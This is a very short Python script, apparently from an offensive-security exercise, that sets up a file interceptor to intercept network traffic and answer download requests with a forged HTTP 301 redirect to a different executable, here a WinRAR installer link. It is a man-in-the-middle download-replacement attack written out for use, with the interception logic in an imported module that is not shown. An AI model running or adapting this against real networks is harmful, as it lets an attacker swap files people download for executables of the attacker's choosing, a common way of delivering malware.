#! usr/bin/env python
import file_interceptor
load_src = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"

interceptor = file_interceptor.FileInterceptor(load_src, 10000, 10000)
